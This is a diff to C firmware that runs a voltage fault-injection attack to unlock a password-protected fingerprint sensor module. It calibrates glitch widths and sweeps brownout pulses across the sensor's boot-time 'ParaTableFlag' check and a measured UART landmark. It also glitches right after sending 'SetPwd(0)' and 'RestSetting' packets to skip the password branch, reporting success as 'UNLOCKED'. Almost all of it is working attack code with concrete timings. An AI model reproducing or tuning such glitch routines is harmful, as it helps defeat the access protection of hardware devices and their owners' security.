-        s_hal->power_cycle_gp3(s_hal_ctx, 25, 65);
+        /* 3. Calibrate exact dual-rail capacitor reset threshold `crit_cycles` at 240 MHz! */
+        s_hal->power_cycle_gp3(s_hal_ctx, 55, effective_boot_settle_ms(65u));
         s_crit_cycles = calibrate_crit_cycles(addr != 0u ? addr : FP_FACTORY_ADDRESS);
         out->crit_cycles = s_crit_cycles;
         snprintf(out->summary, sizeof(out->summary),
-                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK CAL=%" PRIu32 "c (Pass 1/%u)",
-                 addr, s_crit_cycles, FP_UNLOCK_MAX_PASSES);
+                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK BOOT=%u/%ums CAL=%" PRIu32 "c (1/%u)",
+                 addr, (unsigned)s_tx_rise_us, (unsigned)s_boot_ms,
+                 s_crit_cycles, FP_UNLOCK_MAX_PASSES);
         return;
     }
 
@@ -1531,21 +1734,20 @@ void fp_unlock_run_pass(const fp_transport_t *t, uint8_t pass, uint32_t hint_add
 
     if (pass >= 2u && pass <= 12u) {
         /*
-         * Boot `ParaTableFlag != 0x1234` & SRAM Copy Brownout Sweep:
-         * Sweeps `boot_delay_us` across `[120 us .. 18,000 us]` after GP3 rises, pulsing right at
-         * `[88%, 95%, 100%, 105%] * s_crit_cycles` in both Hi-Z TX and Active Crowbar modes!
+         * Primary Boot `ParaTableFlag != 0x1234` NOR-Flash Brownout Shelf Sweep (`[120 us .. 18,000 us]`):
+         * Continuous 325 us spacing with 250-350 us wide brownout shelf -> zero timing blind spots!
          */
-        uint32_t base_us = 120u + (uint32_t)(pass - 2u) * 1600u;
-        for (unsigned step = 0; step < 8u; step++) {
+        uint32_t base_us = 120u + (uint32_t)(pass - 2u) * 1625u;
+        for (unsigned step = 0; step < 5u; step++) {
             unlock_yield_wdt();
-            uint32_t d_us = base_us + step * 200u;
-            uint32_t pct = 88u + (step % 4u) * 5u;
+            uint32_t d_us = base_us + step * 325u;
+            uint32_t pct = 90u + (step % 4u) * 4u;
             uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct) / 100u);
-            bool crowbar = (step >= 4u);
+            bool shelf = (step != 2u);
 
-            s_hal->power_cycle_gp3(s_hal_ctx, 18, 0);
-            s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, crowbar);
-            unlock_sleep_ms(55);
+            s_hal->power_cycle_gp3(s_hal_ctx, 35, 0);
+            s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, shelf);
+            unlock_sleep_ms(effective_boot_settle_ms(55u));
 
             if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
                 snprintf(out->summary, sizeof(out->summary),
@@ -1554,7 +1756,6 @@ void fp_unlock_run_pass(const fp_transport_t *t, uint8_t pass, uint32_t hint_add
                 return;
             }
         }
-        s_hal->power_cycle_gp3(s_hal_ctx, 20, 60);
         out->crit_cycles = s_crit_cycles;
         snprintf(out->summary, sizeof(out->summary),
                  "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK GLITCH=%u/%u (%" PRIu32 "c)",
@@ -1562,24 +1763,68 @@ void fp_unlock_run_pass(const fp_transport_t *t, uint8_t pass, uint32_t hint_add
         return;
     }
 
-    /* Passes 13 .. 16: Live Instruction-Dispatch Branch-Skip Glitch right after `SetPwd(0)` stop bit! */
-    const uint8_t set_zero_payload[5] = { FP_INS_SET_PWD, 0, 0, 0, 0 };
-    uint8_t cmd_pkt[20];
-    size_t cmd_len = fp_sensor_encode_packet(cmd_pkt, sizeof(cmd_pkt), addr,
-                                             FP_PID_COMMAND, set_zero_payload, sizeof(set_zero_payload));
-    uint32_t base_cmd_us = 8u + (uint32_t)(pass - 13u) * 150u;
+    if (pass >= 13u && pass <= 19u) {
+        /*
+         * Precision Hardware-Landmark Sweep centered directly on measured `s_tx_rise_us`
+         * (`UART_Init` right after `LoadParaTableFromFlash()`) + extended boot span up to `s_boot_ms`!
+         */
+        uint32_t center_us = s_tx_rise_us > 5000u ? (s_tx_rise_us - 4500u) : 80u;
+        uint32_t span_step_us = 290u;
+        if (pass >= 17u && s_boot_ms > 20u) {
+            center_us = 18000u + (uint32_t)(pass - 17u) * (((s_boot_ms * 1000u) - 18000u) / 3u);
+            span_step_us = (((s_boot_ms * 1000u) - 18000u) / 15u) + 1u;
+        }
+        else {
+            center_us += (uint32_t)(pass - 13u) * 1450u;
+        }
 
-    for (unsigned step = 0; step < 10u && cmd_len > 0u; step++) {
+        for (unsigned step = 0; step < 5u; step++) {
+            unlock_yield_wdt();
+            uint32_t d_us = center_us + step * span_step_us;
+            uint32_t pct = 88u + step * 3u;
+            uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct) / 100u);
+
+            s_hal->power_cycle_gp3(s_hal_ctx, 35, 0);
+            s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, (step & 1u) == 0u);
+            unlock_sleep_ms(effective_boot_settle_ms(55u));
+
+            if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
+                snprintf(out->summary, sizeof(out->summary),
+                         "UNLOCKED via LANDMARK-GLITCH(t=%uus,w=%" PRIu32 "c) -> A=0xFFFFFFFF",
+                         (unsigned)d_us, w_cyc);
+                return;
+            }
+        }
+        out->crit_cycles = s_crit_cycles;
+        snprintf(out->summary, sizeof(out->summary),
+                 "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK GLITCH=%u/%u (%" PRIu32 "c)",
+                 addr, (unsigned)pass, FP_UNLOCK_MAX_PASSES, s_crit_cycles);
+        return;
+    }
+
+    /* Passes 20 .. 24: Live Instruction-Dispatch Branch-Skip Glitch after `SetPwd(0)` & `RestSetting`! */
+    const uint8_t set_zero_payload[5] = { FP_INS_SET_PWD, 0, 0, 0, 0 };
+    const uint8_t rst_payload[1] = { FP_INS_REST_SETTING };
+    uint8_t set_pkt[20];
+    uint8_t rst_pkt[20];
+    size_t set_len = fp_sensor_encode_packet(set_pkt, sizeof(set_pkt), addr,
+                                             FP_PID_COMMAND, set_zero_payload, sizeof(set_zero_payload));
+    size_t rst_len = fp_sensor_encode_packet(rst_pkt, sizeof(rst_pkt), addr,
+                                             FP_PID_COMMAND, rst_payload, sizeof(rst_payload));
+    uint32_t base_cmd_us = 6u + (uint32_t)(pass - 20u) * 120u;
+
+    for (unsigned step = 0; step < 5u && set_len > 0u; step++) {
         unlock_yield_wdt();
-        uint32_t d_us = base_cmd_us + step * 15u;
-        uint32_t pct = 90u + (step % 4u) * 4u;
+        uint32_t d_us = base_cmd_us + step * 24u;
+        uint32_t pct = 92u + (step % 4u) * 3u;
         uint32_t w_cyc = (uint32_t)(((uint64_t)s_crit_cycles * pct) / 100u);
+        bool use_rst = ((step & 1u) != 0u) && (rst_len > 0u);
 
         if (s_hal->uart_write_raw != NULL) {
-            (void)s_hal->uart_write_raw(s_hal_ctx, cmd_pkt, cmd_len);
+            (void)s_hal->uart_write_raw(s_hal_ctx, use_rst ? rst_pkt : set_pkt, use_rst ? rst_len : set_len);
         }
-        s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, true);
-        unlock_sleep_ms(30);
+        s_hal->glitch_pulse(s_hal_ctx, d_us, w_cyc, false);
+        unlock_sleep_ms(65u);
 
         if (check_already_unlocked_or_glitch_hit(t, &addr, out)) {
             snprintf(out->summary, sizeof(out->summary),
@@ -1587,11 +1832,17 @@ void fp_unlock_run_pass(const fp_transport_t *t, uint8_t pass, uint32_t hint_add
                      (unsigned)d_us, w_cyc);
             return;
         }
-        s_hal->power_cycle_gp3(s_hal_ctx, 18, 55);
+        s_hal->power_cycle_gp3(s_hal_ctx, 40, effective_boot_settle_ms(55u));
+    }
+
+    /* Final guaranteed full cold reboot at end of Pass 24 so sensor UART is 100% responsive immediately! */
+    if (pass >= FP_UNLOCK_MAX_PASSES) {
+        s_hal->power_cycle_gp3(s_hal_ctx, 80, effective_boot_settle_ms(260u));
     }
 
     out->crit_cycles = s_crit_cycles;
     snprintf(out->summary, sizeof(out->summary),
-             "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK GLITCH=%u/%u DONE (SWD GP4/5 ready)",
-             addr, (unsigned)pass, FP_UNLOCK_MAX_PASSES);
+             "TX=GPIO1, RX=GPIO2 | A=0x%08" PRIX32 " GP3=OK BOOT=%u/%ums CAL=%" PRIu32 "c (%u/%u)",
+             addr, (unsigned)s_tx_rise_us, (unsigned)s_boot_ms,
+             s_crit_cycles, (unsigned)pass, FP_UNLOCK_MAX_PASSES);
 }
